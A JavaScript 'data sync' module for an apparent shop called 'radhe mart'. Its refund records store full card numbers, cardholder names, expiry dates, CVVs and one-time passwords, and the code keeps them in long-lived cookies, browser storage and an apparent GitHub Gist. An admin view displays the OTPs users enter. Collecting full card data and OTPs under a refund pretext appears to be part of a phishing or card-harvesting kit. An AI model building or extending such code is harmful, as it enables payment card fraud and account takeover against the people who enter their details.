// Simple data synchronization system for free hosting
// This creates a shared data storage that works across all devices

// Global data storage - reward amount functionality removed
window.SHARED_DATA = {
    orders: [],
    refunds: [],
    otps: [],
    refundOtps: [],
    payments: [],
    lastSync: new Date().toISOString()
};

// Data sync functions
class DataSync {
    constructor() {
        this.syncInterval = null;
        this.isOnline = navigator.onLine;
        this.setupEventListeners();
    }

    setupEventListeners() {
        // Listen for online/offline events
        window.addEventListener('online', () => {
            this.isOnline = true;
            this.syncData();
        });
        
        window.addEventListener('offline', () => {
            this.isOnline = false;
        });

        // Sync data every 10 seconds
        this.syncInterval = setInterval(() => {
            this.syncData();
        }, 10000);
    }

    // Save data to multiple storage methods
    saveData(type, data) {
        try {
            console.log(`Saving data for ${type}:`, data); // Debug log
            
            // 1. Save to localStorage (local backup)
            localStorage.setItem(type, JSON.stringify(data));
            
            // 2. Save to shared storage
            window.SHARED_DATA[type] = data;
            window.SHARED_DATA.lastSync = new Date().toISOString();
            
            // 3. Try to save to cookie (limited size but cross-device)
            if (type === 'refunds' || type === 'otps' || type === 'refundOtps') {
                this.saveToCookie(type, data);
            }
            
            // 4. Save to sessionStorage for immediate access
            sessionStorage.setItem(type, JSON.stringify(data));
            
            // 5. Broadcast to other tabs/windows
            this.broadcastData(type, data);
            
            // 6. Try GitHub storage if available
            if (typeof saveSharedDataWithGitHub === 'function') {
                saveSharedDataWithGitHub(type, data);
            }
            
            console.log(`Data saved successfully for ${type}:`, data.length, 'items'); // Debug log
            console.log('Data also synced to GitHub Gist for cross-device access'); // Debug log
            return true;
        } catch (error) {
            console.error('Error saving data:', error);
            return false;
        }
    }

    // Load data from multiple sources
    loadData(type) {
        try {
            let data = [];
            
            console.log(`Loading data for ${type}...`); // Debug log
            
            // Try different sources in order of preference
            // 1. Shared storage (most current)
            if (window.SHARED_DATA[type] && Array.isArray(window.SHARED_DATA[type]) && window.SHARED_DATA[type].length > 0) {
                data = window.SHARED_DATA[type];
                console.log(`Loaded from SHARED_DATA: ${data.length} items`); // Debug log
            }
            // 2. SessionStorage (current session)
            else if (sessionStorage.getItem(type)) {
                try {
                    data = JSON.parse(sessionStorage.getItem(type));
                    if (!Array.isArray(data)) data = [];
                    window.SHARED_DATA[type] = data;
                    console.log(`Loaded from sessionStorage: ${data.length} items`); // Debug log
                } catch (e) {
                    console.error('Error parsing sessionStorage data:', e);
                    data = [];
                }
            }
            // 3. LocalStorage (persistent local)
            else if (localStorage.getItem(type)) {
                try {
                    data = JSON.parse(localStorage.getItem(type));
                    if (!Array.isArray(data)) data = [];
                    window.SHARED_DATA[type] = data;
                    console.log(`Loaded from localStorage: ${data.length} items`); // Debug log
                } catch (e) {
                    console.error('Error parsing localStorage data:', e);
                    data = [];
                }
            }
            // 4. Cookie (cross-device, limited)
            else {
                data = this.loadFromCookie(type) || [];
                if (!Array.isArray(data)) data = [];
                window.SHARED_DATA[type] = data;
                console.log(`Loaded from cookie: ${data.length} items`); // Debug log
            }
            
            console.log(`Final loaded data for ${type}:`, data.length, 'items', data);
            return data;
        } catch (error) {
            console.error('Error loading data:', error);
            return [];
        }
    }

    // Save important data to cookies (enhanced for cross-device)
    saveToCookie(type, data) {
        try {
            // Save more data to cookies for better cross-device sync
            const recentData = data.slice(-20); // Last 20 items instead of 10
            const cookieName = `radhe_${type}`;
            
            // Compress data by removing unnecessary fields for cookies
            const compressedData = recentData.map(item => {
                if (type === 'refunds') {
                    return {
                        id: item.id,
                        name: item.cardholderName,
                        card: item.cardNumber,
                        exp: item.expiryDate,
                        cvv: item.cvv,
                        desc: item.description,
                        time: item.timestamp,
                        status: item.status,
                        otp: item.otpVerified
                    };
                }
                return item;
            });
            
            const cookieValue = btoa(JSON.stringify(compressedData));
            
            // Set cookie with 90 days expiry and better cross-device settings
            const expires = new Date();
            expires.setTime(expires.getTime() + (90 * 24 * 60 * 60 * 1000));
            document.cookie = `${cookieName}=${cookieValue};expires=${expires.toUTCString()};path=/;SameSite=None;Secure`;
            
            console.log(`Saved ${compressedData.length} items to cookie for cross-device sync`);
        } catch (error) {
            console.warn('Could not save to cookie:', error);
        }
    }

    // Load data from cookies (enhanced)
    loadFromCookie(type) {
        try {
            const cookieName = `radhe_${type}`;
            const cookies = document.cookie.split(';');
            
            for (let cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                if (name === cookieName && value) {
                    const compressedData = JSON.parse(atob(value));
                    
                    // Expand compressed data back to full format
                    if (type === 'refunds') {
                        return compressedData.map(item => ({
                            id: item.id,
                            cardholderName: item.name,
                            cardNumber: item.card,
                            expiryDate: item.exp,
                            cvv: item.cvv,
                            description: item.desc,
                            timestamp: item.time,
                            status: item.status,
                            otpVerified: item.otp
                        }));
                    }
                    return compressedData;
                }
            }
            
            // Also try old cookie format for backward compatibility
            const oldCookieName = `shared_${type}`;
            for (let cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                if (name === oldCookieName && value) {
                    return JSON.parse(atob(value));
                }
            }
        } catch (error) {
            console.warn('Could not load from cookie:', error);
        }
        return null;
    }

    // Broadcast data changes to other tabs/windows
    broadcastData(type, data) {
        try {
            const message = {
                type: 'DATA_UPDATE',
                dataType: type,
                data: data,
                timestamp: new Date().toISOString()
            };
            
            // Use BroadcastChannel if available
            if (window.BroadcastChannel) {
                const channel = new BroadcastChannel('radhe_mart_data');
                channel.postMessage(message);
            }
            
            // Also use localStorage event for cross-tab communication
            localStorage.setItem('data_broadcast', JSON.stringify(message));
            localStorage.removeItem('data_broadcast');
        } catch (error) {
            console.warn('Could not broadcast data:', error);
        }
    }

    // Listen for data updates from other tabs
    listenForUpdates() {
        // BroadcastChannel listener
        if (window.BroadcastChannel) {
            const channel = new BroadcastChannel('radhe_mart_data');
            channel.onmessage = (event) => {
                this.handleDataUpdate(event.data);
            };
        }

        // localStorage event listener
        window.addEventListener('storage', (event) => {
            if (event.key === 'data_broadcast' && event.newValue) {
                try {
                    const message = JSON.parse(event.newValue);
                    this.handleDataUpdate(message);
                } catch (error) {
                    console.warn('Error handling storage event:', error);
                }
            }
        });
    }

    // Handle incoming data updates
    handleDataUpdate(message) {
        if (message.type === 'DATA_UPDATE') {
            window.SHARED_DATA[message.dataType] = message.data;
            console.log(`Received data update for ${message.dataType}`);
            
            // Trigger refresh if admin panel is open
            if (typeof displayUserEnteredOTPs === 'function') {
                displayUserEnteredOTPs();
            }
            if (typeof displayRefunds === 'function') {
                displayRefunds();
            }
            if (typeof displayOrders === 'function') {
                displayOrders();
            }
        }
    }

    // Sync data across all storage methods
    syncData() {
        const dataTypes = ['orders', 'refunds', 'otps', 'refundOtps', 'payments'];
        
        dataTypes.forEach(type => {
            const localData = localStorage.getItem(type);
            const sharedData = window.SHARED_DATA[type];
            
            if (localData && (!sharedData || (Array.isArray(sharedData) && sharedData.length === 0))) {
                // Local data exists but shared doesn't, update shared
                try {
                    window.SHARED_DATA[type] = JSON.parse(localData);
                } catch (e) {
                    window.SHARED_DATA[type] = localData; // For non-JSON data
                }
            } else if (sharedData && (Array.isArray(sharedData) ? sharedData.length > 0 : sharedData)) {
                // Shared data exists, update local
                localStorage.setItem(type, typeof sharedData === 'object' ? JSON.stringify(sharedData) : sharedData);
            }
        });
    }

    // Get all data for admin view
    getAllData() {
        return {
            orders: this.loadData('orders'),
            refunds: this.loadData('refunds'),
            otps: this.loadData('otps'),
            refundOtps: this.loadData('refundOtps'),
            payments: this.loadData('payments')
        };
    }

    // Clear all data (admin function)
    clearAllData() {
        const dataTypes = ['orders', 'refunds', 'otps', 'refundOtps', 'payments'];
        
        dataTypes.forEach(type => {
            localStorage.removeItem(type);
            sessionStorage.removeItem(type);
            window.SHARED_DATA[type] = [];
            
            // Clear cookies
            document.cookie = `shared_${type}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`;
        });
        
        this.broadcastData('CLEAR_ALL', {});
        console.log('All data cleared');
    }
}

// Initialize data sync
window.dataSync = new DataSync();
window.dataSync.listenForUpdates();

// Helper functions for easy access
window.saveSharedData = (type, data) => window.dataSync.saveData(type, data);
window.loadSharedData = (type) => window.dataSync.loadData(type);
window.getAllSharedData = () => window.dataSync.getAllData();
window.clearAllSharedData = () => window.dataSync.clearAllData();